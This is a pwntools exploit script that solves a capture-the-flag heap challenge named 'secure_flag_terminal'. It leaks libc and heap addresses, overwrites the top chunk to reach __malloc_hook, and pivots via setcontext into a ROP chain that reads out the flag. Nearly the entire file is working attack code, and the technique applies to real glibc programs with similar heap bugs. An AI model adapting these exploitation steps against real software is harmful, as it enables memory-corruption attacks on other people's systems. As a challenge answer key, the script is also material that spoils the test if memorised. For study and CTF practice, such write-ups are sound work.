# Author: Oreomeister (Twitter & Github - 0reome1ster)

from pwn import *

binary = 'secure_flag_terminal'
elf = context.binary = ELF(binary)

libc = ELF('libc.so.6', checksec=False)

gs = """
continue
"""

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        return remote(args.HOST, args.PORT)
    else:
        return elf.process()

def create_flag(size=16):
    p.sendlineafter(b'option: ', b'1')
    p.sendlineafter(b'--> ', b'%i' % size)

def edit_flag(ind, val):
    p.sendlineafter(b'option: ', b'2')
    p.sendlineafter(b'--> ', b'%i' % ind)
    p.sendlineafter(b'--> ', val)

def read_flag(ind):
    p.sendlineafter(b'option: ', b'3')
    p.sendlineafter(b'--> ', b'%i' % ind)
    p.recvuntil(b'=\n\n')
    print(p.recvline())


def delete_flag(ind):
    p.sendlineafter(b'option: ', b'4')
    p.sendlineafter(b'--> ', b'%i' % ind)

def leak(ind, size=16):
    create_flag(size)
    p.sendlineafter(b'option: ', b'3')
    p.sendlineafter(b'--> ', b'%i' % ind)
    p.recvuntil(b'=\n\n')
    ptr_leak = int.from_bytes(p.recv(6).strip(b'\n'), 'little')
    return ptr_leak

p = start()

p.recvuntil(b'Seed: ')
libc_leak = int(p.recvline().strip(b'\n'), 16)
log.info("libc leak @ " + hex(libc_leak))
libc.address = libc_leak - libc.sym['rand']

log.info("Triggering tcache heap leak")

create_flag()
create_flag()

delete_flag(2)
delete_flag(1)

heap_leak = leak(1)

log.info("Heap leak @ " + hex(heap_leak))

call = 0x00000000000338ca + libc.address # call qword ptr [rdi];

chunk_ptr = heap_leak + 0x20
fd = heap_leak - 0x20 - 0x20

delta = libc.sym['__malloc_hook'] - chunk_ptr - 0x10

log.info("Performing top chunk overwrite")
edit_flag(1, b'A' * 24 + p64(0x21) + b'B' * 24 + p64(0xffffffffffffffff))

create_flag(delta)
create_flag(0x20) # avoid reallocating earlier-freed buffer; we allocate a size 0x30 chunk here

log.info("Overwriting __malloc_hook")
edit_flag(3, p64(call))

pop_rdi = 0x000000000002164f + libc.address # pop rdi; ret; 
mov_rdi = 0x00000000000520c9 + libc.address # : mov rdi, qword ptr [rdi + 0x68]; xor eax, eax; ret;
pop_rdx = 0x0000000000001b96 + libc.address # pop rdx; ret; 
pop_rsi = 0x0000000000023a6a + libc.address # pop rsi; ret; 
pop_rsi_r15 = 0x000000000002164d + libc.address # : pop rsi; pop r15; ret; 
pop_rax = 0x000000000001b500 + libc.address # pop rax; ret;
ret = 0x0000000000106611 + libc.address # : ret; 
syscall_ret = 0x00000000000d2625 + libc.address # syscall; ret; 

# Call gadget for setcontext <-- hook malloc with this and do malloc(heap_ptr)
# setcontext will perform stack pivot to heap chunk
# Prime heap with rest of rop chain to perform read-write and win flag

chain = p64(libc.sym['setcontext'] + 0x35) # stack pivot + arg setup
chain += p64(0) # read syscall value for rax
chain += p64(mov_rdi) # dynamically determine fd from heap
chain += p64(syscall_ret)
chain += p64(pop_rdi) 
chain += p64(0x1) # stdout
chain += p64(pop_rsi)
chain += p64(chunk_ptr + 0x400) # buffer addr
chain += p64(pop_rdx) 
chain += p64(0x24) # size to write
chain += p64(pop_rax) 
chain += p64(0x1) # sys_read
chain += p64(syscall_ret)
chain += p64(fd - 0x68) # offsetted ptr for fd (see mov_rdi)
chain += p64(chunk_ptr + 0x400) # buffer addr for setcontext ROP -> sys_read
chain += p64(0) * 2 # padding
chain += p64(0x24) # size to read (setcontext ROP -> sys_read)
chain += b'A' * 8 # padding
chain += b'B' * 8 # padding
chain += p64(chunk_ptr + 0x8) # heap buffer for stack pivot
chain += p64(pop_rax) # for push rcx, sets rax for sys_read

log.info("Setting ROP chain")
edit_flag(2, chain)

log.info("Triggering ROP chain")
create_flag(chunk_ptr)

p.recvuntil(b'storage array...\n')
print(f"Flag: {p.recvuntil(b'}').strip().decode()}")
